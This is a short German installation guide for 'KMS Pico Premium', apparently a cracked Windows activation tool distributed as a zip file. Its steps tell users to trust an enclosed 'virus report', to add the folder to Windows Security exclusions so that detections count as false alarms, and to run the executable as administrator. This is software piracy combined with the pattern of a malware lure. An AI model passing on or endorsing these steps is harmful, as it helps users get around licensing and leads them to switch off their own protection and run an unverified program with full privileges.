## 🛠 Schritt-für-Schritt-Installation

### Schritt 1 — Herunterladen und Entpacken
Speichern Sie `Powerful-KMS-Pico-Premium.zip` (~50 MB) und entpacken Sie es. **Kein Passwort erforderlich.**

### Schritt 2 — Virenprüfung
Öffnen Sie die Datei `Virenbericht.pdf`, um die Ergebnisse von VirusTotal und Windows Defender einzusehen.

### Schritt 3 — Zu Ausnahmen hinzufügen
Fügen Sie den Ordner zu **Windows-Sicherheit → Ausnahmen** hinzu, um Fehlalarme zu vermeiden.

### Schritt 4 — Als Administrator ausführen
Rechtsklick auf `KMSPicoPremium.exe` → **Als Administrator ausführen**.

### Schritt 5 — Aktivierung starten
Klicken Sie auf den roten Hauptbutton. Warten Sie auf die grüne Meldung „Activated successfully".

### Schritt 6 — Überprüfung
Öffnen Sie **Einstellungen → System → Info** und prüfen Sie den Aktivierungsstatus.
